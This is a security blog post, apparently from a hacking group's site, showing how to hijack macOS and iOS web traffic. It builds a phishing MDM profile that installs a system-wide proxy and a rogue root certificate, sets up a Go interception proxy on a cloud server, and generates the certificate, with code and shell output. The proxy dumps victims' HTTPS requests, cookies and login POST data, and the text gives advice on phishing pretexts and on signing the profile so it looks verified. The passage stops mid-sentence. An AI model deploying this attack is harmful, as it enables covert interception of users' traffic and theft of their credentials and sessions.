<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Hijacking Web Traffic On MacOS and iOS With MDM Profiles" /><meta name="author" content="actae0n" /><meta property="og:locale" content="en" /><meta name="description" content="What Are MDM Profiles? MDM profiles allow organizations to deploy common device configurations across MacOS and iOS devices. They can be deployed by hand, or via 3rd party MDM solutions such as Jamf or Munki. They’re deployed as .mobileconfig files, which are just XML under the hood. Here’s an example config that enforces a wallpaper setting:" /><meta property="og:description" content="What Are MDM Profiles? MDM profiles allow organizations to deploy common device configurations across MacOS and iOS devices. They can be deployed by hand, or via 3rd party MDM solutions such as Jamf or Munki. They’re deployed as .mobileconfig files, which are just XML under the hood. Here’s an example config that enforces a wallpaper setting:" /><link rel="canonical" href="https://blacksunhackers.club/posts/Hijacking-Web-Traffic-MDM-Profiles/" /><meta property="og:url" content="https://blacksunhackers.club/posts/Hijacking-Web-Traffic-MDM-Profiles/" /><meta property="og:site_name" content="Blacksun Hackers Club" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-12-18T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hijacking Web Traffic On MacOS and iOS With MDM Profiles" /><meta name="twitter:site" content="@BlacksunLabs_" /><meta name="twitter:creator" content="@https://twitter.com/actae0n" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"actae0n"},"description":"What Are MDM Profiles? MDM profiles allow organizations to deploy common device configurations across MacOS and iOS devices. They can be deployed by hand, or via 3rd party MDM solutions such as Jamf or Munki. They’re deployed as .mobileconfig files, which are just XML under the hood. Here’s an example config that enforces a wallpaper setting:","url":"https://blacksunhackers.club/posts/Hijacking-Web-Traffic-MDM-Profiles/","@type":"BlogPosting","headline":"Hijacking Web Traffic On MacOS and iOS With MDM Profiles","dateModified":"2021-09-12T03:17:07+08:00","datePublished":"2019-12-18T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://blacksunhackers.club/posts/Hijacking-Web-Traffic-MDM-Profiles/"},"@context":"https://schema.org"}</script><title>Hijacking Web Traffic On MacOS and iOS With MDM Profiles | Blacksun Hackers Club</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Blacksun Hackers Club"><meta name="application-name" content="Blacksun Hackers Club"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/images/bsh_logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Blacksun Hackers Club</a></div><div class="site-subtitle font-italic">Just a bunch of hackers doing what we find fun.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/BlacksunLabs" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/BlacksunLabs_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hijacking Web Traffic On MacOS and iOS With MDM Profiles</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hijacking Web Traffic On MacOS and iOS With MDM Profiles</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Written by <a href=https://twitter.com/actae0n> <b>actae0n</b> </a> </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Dec 18, 2019, 12:00 AM +0800" >Dec 18, 2019<i class="unloaded">2019-12-18T00:00:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 11, 2021, 12:17 PM -0700" >Sep 11, 2021<i class="unloaded">2021-09-12T03:17:07+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2183 words">12 min read</span></div></div><div class="post-content"><h2 id="what-are-mdm-profiles">What Are MDM Profiles?</h2><p>MDM profiles allow organizations to deploy common device configurations across MacOS and iOS devices. They can be deployed by hand, or via 3rd party MDM solutions such as <a href="https://www.jamf.com/">Jamf</a> or <a href="https://github.com/munki/munki/wiki/Managing-Configuration-Profiles">Munki</a>. They’re deployed as <code class="language-plaintext highlighter-rouge">.mobileconfig</code> files, which are just XML under the hood. Here’s an example config that enforces a wallpaper setting:</p><div lang="xml" class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span>
<span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
<span class="nt">&lt;dict&gt;</span>
	<span class="nt">&lt;key&gt;</span>HasRemovalPasscode<span class="nt">&lt;/key&gt;</span>
	    <span class="nt">&lt;false/&gt;</span>
	<span class="nt">&lt;key&gt;</span>PayloadContent<span class="nt">&lt;/key&gt;</span>
	<span class="nt">&lt;array&gt;</span>
		<span class="nt">&lt;dict&gt;</span>
			<span class="nt">&lt;key&gt;</span>PayloadDisplayName<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;string&gt;</span>Desktop Picture<span class="nt">&lt;/string&gt;</span>
			<span class="nt">&lt;key&gt;</span>PayloadIdentifier<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;string&gt;</span>com.apple.desktop<span class="nt">&lt;/string&gt;</span>
			<span class="nt">&lt;key&gt;</span>PayloadType<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;string&gt;</span>com.apple.desktop<span class="nt">&lt;/string&gt;</span>
			<span class="nt">&lt;key&gt;</span>PayloadUUID<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;string&gt;</span>C68C5CBC-A9AD-44F5-8C49-22E78A5D5370<span class="nt">&lt;/string&gt;</span>
			<span class="nt">&lt;key&gt;</span>PayloadVersion<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;integer&gt;</span>1<span class="nt">&lt;/integer&gt;</span>
			<span class="nt">&lt;key&gt;</span>locked<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;true/&gt;</span>
			<span class="nt">&lt;key&gt;</span>override-picture-path<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;string&gt;</span>/usr/local/wallpaper_hax.png<span class="nt">&lt;/string&gt;</span>
		<span class="nt">&lt;/dict&gt;</span>
	<span class="nt">&lt;/array&gt;</span>
	<span class="nt">&lt;key&gt;</span>PayloadIdentifier<span class="nt">&lt;/key&gt;</span>
	    <span class="nt">&lt;string&gt;</span>test.B3664B4A-54C5-4B27-B5C7-30BF3EAD1F29<span class="nt">&lt;/string&gt;</span>
	<span class="nt">&lt;key&gt;</span>PayloadRemovalDisallowed<span class="nt">&lt;/key&gt;</span>
	    <span class="nt">&lt;false/&gt;</span>
	<span class="nt">&lt;key&gt;</span>PayloadType<span class="nt">&lt;/key&gt;</span>
	    <span class="nt">&lt;string&gt;</span>Configuration<span class="nt">&lt;/string&gt;</span>
	<span class="nt">&lt;key&gt;</span>PayloadUUID<span class="nt">&lt;/key&gt;</span>
	    <span class="nt">&lt;string&gt;</span>5ED6ABEF-27E5-4724-BAFB-D5C43761D446<span class="nt">&lt;/string&gt;</span>
	<span class="nt">&lt;key&gt;</span>PayloadVersion<span class="nt">&lt;/key&gt;</span>
	    <span class="nt">&lt;integer&gt;</span>1<span class="nt">&lt;/integer&gt;</span>
<span class="nt">&lt;/dict&gt;</span>
<span class="nt">&lt;/plist&gt;</span>
</pre></table></code></div></div><h2 id="so-what">So What?</h2><p>A user can click on a <code class="language-plaintext highlighter-rouge">.mobileconfig</code> file to launch an installation wizard which will apply the attacker-controlled configuration settings to their device. Interestingly, they’re not currently restricted by Gatekeeper in anyway. At the time of writing, there are no signing or notarization requirements for MDM profiles (to my knowledge). However, there is an interesting UI/UX quirk that works in favor of attackers to increase the odds of a successful installation if you do choose to sign.</p><h2 id="whats-the-plan">What’s The Plan?</h2><p>Let’s build an MDM profile that sets a system wide HTTP proxy so that we can read their web traffic. Additionally, let’s add our own rogue CA certificate to their Keychain, which will be trusted system wide. This will allow us to intercept HTTPS traffic without their browser throwing nasty errors. Our proxy should dump their requests for inspection, so that we can loot session cookies and credentials from it.</p><h2 id="constructing-the-proxy-server">Constructing The Proxy Server</h2><p>There’s a great Go library called <a href="https://github.com/elazarl/goproxy">goproxy</a> that makes it trivial to create custom proxy applications. Let’s modify one of the examples to dump requests that pass through the proxy. This will let us inspect the victim’s cookies and POST data (which will include credentials for login endpoints). There’s a lot of capability that can be built out here to make harvesting loot easier. Write regexes for POSTs to particular domains:uri pairs to pull out passwords. Log cookies to a database and send yourself a notification when a new session is detected for a domain you’re interested in, etc. But for the sake of example, let’s keep it simple.</p><div lang="golang" class="language-golang highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
	<span class="s">"crypto/tls"</span>
	<span class="s">"crypto/x509"</span>
	<span class="s">"flag"</span>
	<span class="s">"io/ioutil"</span>
	<span class="s">"log"</span>
	<span class="s">"net/http"</span>
	<span class="s">"fmt"</span>
	<span class="s">"github.com/elazarl/goproxy"</span>
	<span class="s">"net/http/httputil"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">setCA</span><span class="p">(</span><span class="n">caCert</span><span class="p">,</span> <span class="n">caKey</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
	<span class="n">goproxyCa</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">tls</span><span class="o">.</span><span class="n">X509KeyPair</span><span class="p">(</span><span class="n">caCert</span><span class="p">,</span> <span class="n">caKey</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">err</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="n">goproxyCa</span><span class="o">.</span><span class="n">Leaf</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">x509</span><span class="o">.</span><span class="n">ParseCertificate</span><span class="p">(</span><span class="n">goproxyCa</span><span class="o">.</span><span class="n">Certificate</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">err</span>
	<span class="p">}</span>
	<span class="n">goproxy</span><span class="o">.</span><span class="n">GoproxyCa</span> <span class="o">=</span> <span class="n">goproxyCa</span>
	<span class="n">goproxy</span><span class="o">.</span><span class="n">OkConnect</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">goproxy</span><span class="o">.</span><span class="n">ConnectAction</span><span class="p">{</span><span class="n">Action</span><span class="o">:</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">ConnectAccept</span><span class="p">,</span> <span class="n">TLSConfig</span><span class="o">:</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">TLSConfigFromCA</span><span class="p">(</span><span class="o">&amp;</span><span class="n">goproxyCa</span><span class="p">)}</span>
	<span class="n">goproxy</span><span class="o">.</span><span class="n">MitmConnect</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">goproxy</span><span class="o">.</span><span class="n">ConnectAction</span><span class="p">{</span><span class="n">Action</span><span class="o">:</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">ConnectMitm</span><span class="p">,</span> <span class="n">TLSConfig</span><span class="o">:</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">TLSConfigFromCA</span><span class="p">(</span><span class="o">&amp;</span><span class="n">goproxyCa</span><span class="p">)}</span>
	<span class="n">goproxy</span><span class="o">.</span><span class="n">HTTPMitmConnect</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">goproxy</span><span class="o">.</span><span class="n">ConnectAction</span><span class="p">{</span><span class="n">Action</span><span class="o">:</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">ConnectHTTPMitm</span><span class="p">,</span> <span class="n">TLSConfig</span><span class="o">:</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">TLSConfigFromCA</span><span class="p">(</span><span class="o">&amp;</span><span class="n">goproxyCa</span><span class="p">)}</span>
	<span class="n">goproxy</span><span class="o">.</span><span class="n">RejectConnect</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">goproxy</span><span class="o">.</span><span class="n">ConnectAction</span><span class="p">{</span><span class="n">Action</span><span class="o">:</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">ConnectReject</span><span class="p">,</span> <span class="n">TLSConfig</span><span class="o">:</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">TLSConfigFromCA</span><span class="p">(</span><span class="o">&amp;</span><span class="n">goproxyCa</span><span class="p">)}</span>
	<span class="k">return</span> <span class="no">nil</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">verbose</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">Bool</span><span class="p">(</span><span class="s">"v"</span><span class="p">,</span> <span class="no">false</span><span class="p">,</span> <span class="s">"should every proxy request be logged to stdout"</span><span class="p">)</span>
	<span class="n">addr</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"addr"</span><span class="p">,</span> <span class="s">":443"</span><span class="p">,</span> <span class="s">"proxy listen address"</span><span class="p">)</span>
	<span class="n">certPath</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"cert"</span><span class="p">,</span> <span class="s">"cert.crt"</span><span class="p">,</span> <span class="s">"Path to CA certificate"</span><span class="p">)</span>
	<span class="n">keyPath</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"key"</span><span class="p">,</span> <span class="s">"key.pem"</span><span class="p">,</span> <span class="s">"Path to CA key"</span><span class="p">)</span>
	<span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>
	<span class="n">certData</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">ioutil</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="o">*</span><span class="n">certPath</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Fatalf</span><span class="p">(</span><span class="s">"Couldn't read certificate: %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">keyData</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">ioutil</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="o">*</span><span class="n">keyPath</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Fatalf</span><span class="p">(</span><span class="s">"Couldn't read key: %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">setCA</span><span class="p">(</span><span class="n">certData</span><span class="p">,</span> <span class="n">keyData</span><span class="p">)</span>
	<span class="n">proxy</span> <span class="o">:=</span> <span class="n">goproxy</span><span class="o">.</span><span class="n">NewProxyHttpServer</span><span class="p">()</span>
	<span class="n">proxy</span><span class="o">.</span><span class="n">OnRequest</span><span class="p">()</span><span class="o">.</span><span class="n">HandleConnect</span><span class="p">(</span><span class="n">goproxy</span><span class="o">.</span><span class="n">AlwaysMitm</span><span class="p">)</span>
	<span class="n">proxy</span><span class="o">.</span><span class="n">Verbose</span> <span class="o">=</span> <span class="o">*</span><span class="n">verbose</span>
	<span class="n">proxy</span><span class="o">.</span><span class="n">OnRequest</span><span class="p">()</span><span class="o">.</span><span class="n">DoFunc</span><span class="p">(</span><span class="k">func</span><span class="p">(</span><span class="n">req</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">,</span> <span class="n">ctx</span> <span class="o">*</span><span class="n">goproxy</span><span class="o">.</span><span class="n">ProxyCtx</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">,</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Response</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">requestData</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">httputil</span><span class="o">.</span><span class="n">DumpRequest</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="no">true</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Failed to dump request: %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
		<span class="p">}</span>
		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">requestData</span><span class="p">))</span>
		<span class="k">return</span> <span class="n">req</span><span class="p">,</span> <span class="no">nil</span>
	<span class="p">})</span>
	<span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="n">proxy</span><span class="p">))</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="deploying-the-proxy-server">Deploying The Proxy Server</h2><p>Infrastructure-wise, I’m just going to throw the proxy setup into an ec2 instance in AWS. I’ll point a domain (<code class="language-plaintext highlighter-rouge">0day.gg</code>) at it, and assign a security group allowing port 443 inbound. Our proxy will need a CA certificate to use. Let’s generate one real quick. There’s a utility called <a href="https://github.com/square/certstrap">certstrap</a> by Square that I like to use in place of the OpenSSL cli that simplifies the process of generating certificates, certificate signing requests, etc.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre>ubuntu@ip-172-31-23-174:~$ go version
go version go1.13.5 linux/amd64

ubuntu@ip-172-31-23-174:~$ go install github.com/square/certstrap
go: finding github.com/square/certstrap v1.2.0
go: downloading github.com/square/certstrap v1.2.0
go: extracting github.com/square/certstrap v1.2.0
go: downloading github.com/urfave/cli v1.21.0
go: downloading github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2c
go: extracting github.com/urfave/cli v1.21.0
go: extracting github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2c
go: downloading golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85
go: extracting golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85
go: downloading golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35
go: extracting golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35
go: finding github.com/urfave/cli v1.21.0
go: finding github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2c
go: finding golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85
go: finding golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35

ubuntu@ip-172-31-23-174:~$ certstrap init --common-name "Acme Corp"
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Created out/Acme_Corp.key
Created out/Acme_Corp.crt
Created out/Acme_Corp.crl

ubuntu@ip-172-31-23-174:~$ head out/Acme_Corp.key out/Acme_Corp.crt
==&gt; out/Acme_Corp.key &lt;==
-----BEGIN RSA PRIVATE KEY-----
MIIJJwIBAAKCAgEAtZdDShW/w7jlYKOaVA8PWg+ax94LVq86vXQj0YIT8DvlNLwr
9V0EWhLnPVCNAOPp077t+k8zlhybOfLaT8S9byzWGN8VH3IU79J6mzonvjIIyX14
uy5dZRL488bExVokg23DREoIJfMAtsPzGgs1xyhym8qZe70YSMrSUMS5RB8oSS8e
gId5M27mhmCCaDn2KN6FJD+LjJJZL/7lsbGHWlE9+HdcRQ1L//elvROeXm5MuAOm
aFU3GWKqkGhIGD09sDmJQoUc6v2ABWSVJ6nnhSrUPlHUvmnyJeSZHVZtTA5kV7sb
eCHTgUk1tE2GgdF9yLb6ddiENAitTlE5pxC9n+LmxiPZIr1f+8dqsjc9H7dReTsV
8hNlP7jOQ6ur3Nw1q0C9ktCrEwoN75GM7O6Ve+1vJXMWeld8pkyyOeKG+NP+ULRU
uLi20QR3COZXrjYKLEQIKM7oaOBIkTVwJni4xxKZw6h8GhuGD9mltV+DPMnr/DcW
Ax5kCeAQy1ovK7qU0kbtF23bQ2LE++iQpDzKAu9TAWCaIy2ZlTxhBVgsAEQW4gto

==&gt; out/Acme_Corp.crt &lt;==
-----BEGIN CERTIFICATE-----
MIIE6DCCAtCgAwIBAgIBATANBgkqhkiG9w0BAQsFADAUMRIwEAYDVQQDEwlBY21l
IENvcnAwHhcNMTkxMjE5MDQzNDU2WhcNMjEwNjE5MDQzNDUyWjAUMRIwEAYDVQQD
EwlBY21lIENvcnAwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC1l0NK
Fb/DuOVgo5pUDw9aD5rH3gtWrzq9dCPRghPwO+U0vCv1XQRaEuc9UI0A4+nTvu36
TzOWHJs58tpPxL1vLNYY3xUfchTv0nqbOie+MgjJfXi7Ll1lEvjzxsTFWiSDbcNE
Sggl8wC2w/MaCzXHKHKbypl7vRhIytJQxLlEHyhJLx6Ah3kzbuaGYIJoOfYo3oUk
P4uMklkv/uWxsYdaUT34d1xFDUv/96W9E55ebky4A6ZoVTcZYqqQaEgYPT2wOYlC
hRzq/YAFZJUnqeeFKtQ+UdS+afIl5JkdVm1MDmRXuxt4IdOBSTW0TYaB0X3Itvp1
2IQ0CK1OUTmnEL2f4ubGI9kivV/7x2qyNz0ft1F5OxXyE2U/uM5Dq6vc3DWrQL2S
</pre></table></code></div></div><p>Let’s kick off the proxy server so it’s ready. If you’re lazy and just want to clone the super basic proxy server code, it’s located <a href="https://github.com/xpcmdshell/procksy">here</a>. I’m just going to throw this into an ec2 instance in AWS.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>ubuntu@ip-172-31-23-174:~$ cd procksy/
ubuntu@ip-172-31-23-174:~/procksy$ ls
go.mod  go.sum  main.go
ubuntu@ip-172-31-23-174:~/procksy$ sudo ./procksy -cert ../out/Acme_Corp.crt -key ../out/Acme_Corp.key
</pre></table></code></div></div><p>Alright, now the proxy is listening and ready to capture web traffic. Let’s move on to the next step, setting up our malicious profile.</p><h2 id="building-the-profile">Building The Profile</h2><p>For simplicity, I’m going to use <a href="https://apps.apple.com/us/app/apple-configurator-2/id1037126344">Apple’s Configurator 2</a> to generate the profile. An alternative is <a href="https://apps.apple.com/us/app/imazing-profile-editor/id1487860882">iMazing Profile Editor</a>. There’s plenty of graphical profile editor utilities, which one you use is up to you. When you open Configurator, you’ll be presented a screen that looks like the following:</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/configurator_open.png" alt="Apple Configurator 2" /></p><p>Click <code class="language-plaintext highlighter-rouge">File -&gt; New Profile</code> and you’ll come to the profile editor window. The first tab, <code class="language-plaintext highlighter-rouge">General</code>, lets us set up a name (the profile title), a unique identifier, an organizational identifier, a description to display to the user during installation. Use these fields to tailor the install experience to your phishing pretext.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/configurator_general.png" alt="General Profile Configuration" /></p><p>An important feature to note on this page is the support for automatic removal. You can set the profile to expire after a specified duration, or on a specified date. When the expiry criteria is met, the profile will be automatically uninstalled, and any settings it changed will be reverted. This includes removing your installed certificate from the Keychain.</p><p>Next, let’s set up the Proxy configuration. You’ll need to set the hostname and port. You can optionally configure a username and password to authenticate to the proxy with, if your setup supports it.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/configurator_proxy.png" alt="Proxy Configuration" /></p><p>In order to proxy HTTPS traffic without generating trust errors, we’ll need their system to trust our CA. Let’s add our rogue CA certificate to their Keychain. When you click <code class="language-plaintext highlighter-rouge">Configure</code>, you’ll be given a file selection dialogue to choose a cert file. After you choose your CA certificate, you’ll see the following image. Don’t worry about the <code class="language-plaintext highlighter-rouge">This root certificate is not trusted</code> warning. It will be trusted once installed by the profile.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/mdm/configurator_ca.png" alt="Certificate Configuration" /></p><p>The last step is to (optionally) sign our profile. Go to <code class="language-plaintext highlighter-rouge">File -&gt; Sign Profile</code>. A dropdown dialogue will appear listing the code signing identities stored in your Keychain. There are benefits and caveats to weigh when signing your profile. One significant benefit is that the user will see a green <code class="language-plaintext highlighter-rouge">Verified</code> indicator in the expanded installation window next to the org name, which may increase the likelihood of them installing the profile. Note that there aren’t any profile signing or notarization requirements by default, so signing is (currently) entirely optional. Gatekeeper won’t try to stop you. For the sake of demonstration, I’ll sign this profile with my developer certificate. Finally, let’s save the profile and get ready to send it to the victim. Go 